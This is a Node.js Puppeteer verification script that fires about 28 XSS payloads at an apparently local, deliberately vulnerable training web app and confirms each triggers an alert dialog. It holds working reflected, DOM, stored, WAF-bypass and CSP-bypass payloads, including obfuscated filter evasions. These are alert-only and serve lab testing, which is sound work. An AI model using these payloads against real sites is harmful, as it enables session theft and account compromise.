// End-to-end browser verification: for each XSS vector, load the vulnerable
// URL (or submit the form) and confirm a dialog fires with our marker.
// Run via: docker exec argentum-local node verify-xss.js

const puppeteer = require('puppeteer-core');
const http = require('http');

const BASE = 'http://127.0.0.1:3001/argentum';

async function postForm(path, fields) {
  return new Promise((resolve, reject) => {
    const data = new URLSearchParams(fields).toString();
    const req = http.request({
      hostname: '127.0.0.1', port: 3001, path: BASE + path, method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': Buffer.byteLength(data) },
    }, res => { res.on('data', () => {}); res.on('end', () => resolve(res.statusCode)); });
    req.on('error', reject);
    req.write(data); req.end();
  });
}

const vectors = [
  // ---------- REFLECTED (8 contexts) ----------
  { name: 'reflected-html-body (blog/search)', kind: 'navigate',
    url: BASE + '/blog/search?q=' + encodeURIComponent('<svg onload=alert("R-HTML-BODY")>') },

  { name: 'reflected-attr-quoted (blog/category)', kind: 'navigate',
    url: BASE + '/blog/category/' + encodeURIComponent('foo" autofocus onfocus=alert("R-ATTR-Q") x="') },

  { name: 'reflected-attr-unquoted (products theme)', kind: 'navigate-hover',
    url: BASE + '/products/pulse?theme=' + encodeURIComponent('foo onmouseover=alert("R-ATTR-UNQ") x') },

  { name: 'reflected-js-string (products utm)', kind: 'navigate',
    url: BASE + '/products/pulse?utm_source=' + encodeURIComponent('";alert("R-JS-STR")//') },

  { name: 'reflected-js-code (products dim)', kind: 'navigate',
    url: BASE + '/products/pulse?dim=' + encodeURIComponent('1;alert("R-JS-CODE")//') },

  { name: 'reflected-css (products accent)', kind: 'navigate',
    url: BASE + '/products/pulse?accent=' + encodeURIComponent('red;}</style><svg onload=alert("R-CSS")>') },

  { name: 'reflected-url (services/redirect)', kind: 'navigate',
    url: BASE + '/services/redirect?next=' + encodeURIComponent('javascript:alert("R-URL")') },

  { name: 'reflected-header (api/track)', kind: 'navigate-with-ua',
    url: BASE + '/api/track?ref=test',
    ua: '<svg onload=alert("R-HEADER")>' },

  // ---------- DOM (7 sinks) ----------
  { name: 'dom-eval (services/calculator)', kind: 'navigate',
    url: BASE + '/services/calculator?expr=' + encodeURIComponent('alert("DOM-EVAL")') },

  { name: 'dom-document.write (services/preview)', kind: 'navigate',
    url: BASE + '/services/preview#' + encodeURIComponent('<svg onload=alert("DOM-WRITE")>') },

  { name: 'dom-postMessage (services/share)', kind: 'navigate-postmsg',
    url: BASE + '/services/share',
    msg: '<img src=x onerror=alert("DOM-POSTMSG")>' },

  { name: 'dom-localStorage->setTimeout (services/theme)', kind: 'navigate-with-localstorage',
    url: BASE + '/services/theme',
    ls: { arg_welcome_script: 'alert("DOM-LS-SETTIMEOUT")' } },

  { name: 'dom-localStorage->innerHTML (account/preferences)', kind: 'navigate-with-localstorage',
    url: BASE + '/account/preferences',
    ls: { arg_nickname: '<img src=x onerror=alert("DOM-LS-INNERHTML")>', arg_greeting: 'hi' } },

  { name: 'dom-document.referrer (account/welcome)', kind: 'navigate-with-referrer',
    url: BASE + '/account/welcome',
    referrerPath: '/services/calculator?expr=' + encodeURIComponent('void(0)') + '&x=' + encodeURIComponent('"><img src=x onerror=alert("DOM-REFERRER")>') },

  { name: 'dom-jquery-html (services/tabs)', kind: 'navigate',
    url: BASE + '/services/tabs#' + encodeURIComponent('<img src=x onerror=alert("DOM-JQ")>') },

  // ---------- WAF tiers (5) ----------
  { name: 'waf-tier1 bypass via <img> (legacy)', kind: 'navigate',
    url: BASE + '/search/legacy?q=' + encodeURIComponent('<img src=x onerror=alert("WAF-T1")>') },

  { name: 'waf-tier2 bypass via attribute injection (v2)', kind: 'navigate',
    url: BASE + '/search/v2?q=' + encodeURIComponent('test" autofocus onfocus=alert("WAF-T2") x="') },

  { name: 'waf-tier3 bypass via javascript: URI (secure)', kind: 'navigate',
    url: BASE + '/search/secure?q=' + encodeURIComponent('"><svg><animate attributeName=href values=javascript:alert("WAF-T3")><a id=x>x</a></svg>') },

  { name: 'waf-tier4 bypass via case+entity (enterprise)', kind: 'navigate',
    url: BASE + '/search/enterprise?q=' + encodeURIComponent('<imG sRc=x OnErRoR=top["al"+"ert"]("WAF-T4")>') },

  // tier 5 is intentionally hard — included as a "may fail" vector
  { name: 'waf-tier5 strong filter (cloud, may legitimately resist)', kind: 'navigate',
    url: BASE + '/search/cloud?q=' + encodeURIComponent('"><img src=x onerror=top["al"+"ert"]("WAF-T5")>') },

  // ---------- CSP scenarios (5 — minus the locked-down internal/board which should resist) ----------
  { name: 'csp-unsafe-inline (marketing/banner)', kind: 'navigate',
    url: BASE + '/marketing/banner?title=' + encodeURIComponent('<svg onload=alert("CSP-INLINE")>') },

  { name: 'csp-unsafe-eval (dashboard/analytics)', kind: 'navigate',
    url: BASE + '/dashboard/analytics?formula=' + encodeURIComponent('alert("CSP-EVAL")') },

  { name: 'csp-nonce-reuse (blog/note)', kind: 'navigate',
    url: BASE + '/blog/note/test?note=' + encodeURIComponent('<img src=x onerror=alert("CSP-NONCE")>') },

  { name: 'csp-angular-template (services/wizard)', kind: 'navigate',
    url: BASE + '/services/wizard?greeting=' + encodeURIComponent("{{constructor.constructor('alert(\\'CSP-NG\\')')()}}") },

  { name: 'csp-strict (internal/board) — should NOT fire', kind: 'navigate-expect-fail',
    url: BASE + '/internal/board?note=' + encodeURIComponent('<svg onload=alert("SHOULD-NOT-FIRE")>') },

  // ---------- STORED (require POST then re-GET) ----------
  { name: 'stored-html-body (blog comments)', kind: 'submit-then-view',
    submit: { path: '/blog/post/modern-growth/comment', fields: { author: 'tester', body: '<svg onload=alert("STORED-COMMENT")>' } },
    viewUrl: BASE + '/blog/post/modern-growth' },

  { name: 'stored-review (products)', kind: 'submit-then-view',
    submit: { path: '/products/pulse/review', fields: { author: 'tester', rating: '5', body: '<img src=x onerror=alert("STORED-REVIEW")>' } },
    viewUrl: BASE + '/products/pulse' },

  { name: 'stored-profile-attribute (avatarAlt)', kind: 'submit-then-view',
    submit: { path: '/account/profile/save', fields: { username: 'jane', display: 'Jane', bio: 'bio', avatarAlt: '" onerror=alert("STORED-AVATAR") x="' } },
    viewUrl: BASE + '/account/profile' },

  { name: 'stored-notes-js-string', kind: 'submit-then-view',
    submit: { path: '/account/notes/add', fields: { title: 'note"; alert("STORED-NOTES"); var x="', body: 'b', tag: 't' } },
    viewUrl: BASE + '/account/notes' },
];

async function visitWithDialog(browser, url, opts = {}) {
  const ctx = await browser.createBrowserContext();
  const page = await ctx.newPage();
  let dialogMsg = null;
  page.on('dialog', async d => { dialogMsg = d.message(); await d.dismiss().catch(() => {}); });
  page.on('pageerror', () => {});  // swallow — we only care about dialogs
  if (opts.ua) await page.setUserAgent(opts.ua);
  if (opts.ls) {
    // Pre-load a stub page to set localStorage for the right origin
    await page.goto(BASE + '/', { waitUntil: 'domcontentloaded', timeout: 10000 });
    await page.evaluate(items => {
      Object.keys(items).forEach(k => localStorage.setItem(k, items[k]));
    }, opts.ls);
  }
  if (opts.referrerPath) {
    // Load referring page first, then click a link to the target
    await page.goto(BASE + opts.referrerPath, { waitUntil: 'domcontentloaded', timeout: 10000 });
    await page.evaluate(target => {
      const a = document.createElement('a');
      a.href = target; a.id = '__go';
      document.body.appendChild(a);
      a.click();
    }, url);
    await new Promise(r => setTimeout(r, 1500));
  } else {
    try { await page.goto(url, { waitUntil: 'networkidle0', timeout: 10000 }); }
    catch (e) {
      // navigation might be aborted by javascript: URI — that's fine
      if (!String(e).includes('net::ERR_ABORTED')) throw e;
    }
  }
  if (opts.hover) {
    try { await page.hover('div[class^="card-"]'); } catch (e) {}
    await new Promise(r => setTimeout(r, 500));
  }
  if (opts.postMessage) {
    await page.evaluate(msg => window.postMessage({ headline: msg }, '*'), opts.postMessage);
    await new Promise(r => setTimeout(r, 800));
  }
  // Tabs DOM XSS — trigger hashchange
  if (opts.triggerHashChange) {
    await page.evaluate(() => window.dispatchEvent(new HashChangeEvent('hashchange')));
    await new Promise(r => setTimeout(r, 800));
  }
  // give async sinks (setTimeout 1000ms) time to fire
  await new Promise(r => setTimeout(r, 1500));
  await ctx.close().catch(() => {});
  return dialogMsg;
}

async function visitJsURI(browser, url) {
  // services/redirect auto-follows after 2s — we just wait
  return visitWithDialog(browser, url, {});
}

(async () => {
  const browser = await puppeteer.launch({
    executablePath: '/usr/bin/chromium',
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
  });

  const results = [];
  for (const v of vectors) {
    let dialog = null;
    try {
      if (v.kind === 'submit-then-view') {
        const code = await postForm(v.submit.path, v.submit.fields);
        if (code >= 400) { results.push({ name: v.name, ok: false, note: 'POST ' + code }); continue; }
        dialog = await visitWithDialog(browser, v.viewUrl);
      } else if (v.kind === 'navigate-hover') {
        dialog = await visitWithDialog(browser, v.url, { hover: true });
      } else if (v.kind === 'navigate-postmsg') {
        dialog = await visitWithDialog(browser, v.url, { postMessage: v.msg });
      } else if (v.kind === 'navigate-with-localstorage') {
        dialog = await visitWithDialog(browser, v.url, { ls: v.ls });
      } else if (v.kind === 'navigate-with-referrer') {
        dialog = await visitWithDialog(browser, v.url, { referrerPath: v.referrerPath });
      } else if (v.kind === 'navigate-with-ua') {
        dialog = await visitWithDialog(browser, v.url, { ua: v.ua });
      } else if (v.kind === 'navigate-expect-fail') {
        dialog = await visitWithDialog(browser, v.url);
      } else {
        dialog = await visitWithDialog(browser, v.url);
      }
    } catch (e) {
      results.push({ name: v.name, ok: false, note: 'error: ' + e.message });
      continue;
    }
    const expectFail = v.kind === 'navigate-expect-fail';
    const fired = dialog !== null;
    const ok = expectFail ? !fired : fired;
    results.push({ name: v.name, ok, dialog: dialog || '—' });
  }

  await browser.close();

  const pass = results.filter(r => r.ok).length;
  const fail = results.length - pass;
  console.log('\n=== XSS verification ===');
  for (const r of results) {
    console.log(`${r.ok ? '✓' : '✗'}  ${r.name}    ${r.dialog ? '[' + r.dialog + ']' : (r.note || '')}`);
  }
  console.log(`\n${pass}/${results.length} vectors fired as expected (${fail} failures).`);
  process.exit(fail === 0 ? 0 : 1);
})().catch(e => { console.error(e); process.exit(2); });
